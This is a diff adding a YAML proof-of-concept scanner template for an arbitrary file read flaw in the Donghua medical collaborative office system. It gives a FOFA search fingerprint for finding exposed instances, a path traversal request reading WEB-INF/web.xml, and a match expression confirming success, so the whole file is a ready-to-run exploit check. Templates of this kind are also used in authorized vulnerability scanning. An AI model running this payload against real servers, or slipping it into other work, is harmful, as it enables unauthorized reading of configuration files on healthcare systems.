@@ -1,0 +1,15 @@
+id: poc-yaml-donghua-templatefile-readfile
+info:
+  name: 东华医疗协同办公系统 templateFile 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 东华医疗协同办公系统
+  fofa: body="/skin/charmBlue/css/dialog.css"
+requests:
+- method: GET
+  path: /common/templateFile?template_name=../../WEB-INF/web.xml
+  expression: "status_code == 200 && \ncontains(body,\"<web-app\") &&\ncontains(body,\"\
+    <context-param>\") &&\ncontains(body,\"<servlet-mapping>\")\n"
+variables: {}
+transport: http
